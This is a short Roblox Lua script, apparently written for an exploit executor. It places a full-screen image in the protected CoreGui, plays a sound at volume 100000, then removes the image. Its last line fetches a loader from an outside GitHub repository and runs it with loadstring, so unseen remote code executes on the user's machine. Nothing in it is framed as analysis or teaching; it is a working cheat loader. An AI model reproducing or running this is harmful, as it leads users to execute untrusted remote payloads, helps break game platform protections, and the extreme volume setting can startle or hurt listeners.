local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=12762570853"
Sound = Instance.new("Sound", game:GetService("Workspace"))
Sound.Name = "XXX"
Sound.SoundId = "rbxassetid://5375693298"
Sound.Looped = false
Sound.Playing = true 
Sound.Volume = 100000
wait(5)
game:GetService("CoreGui").ScreenGui:Destroy()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua')){25461,38193,80986,36913,53714,106448}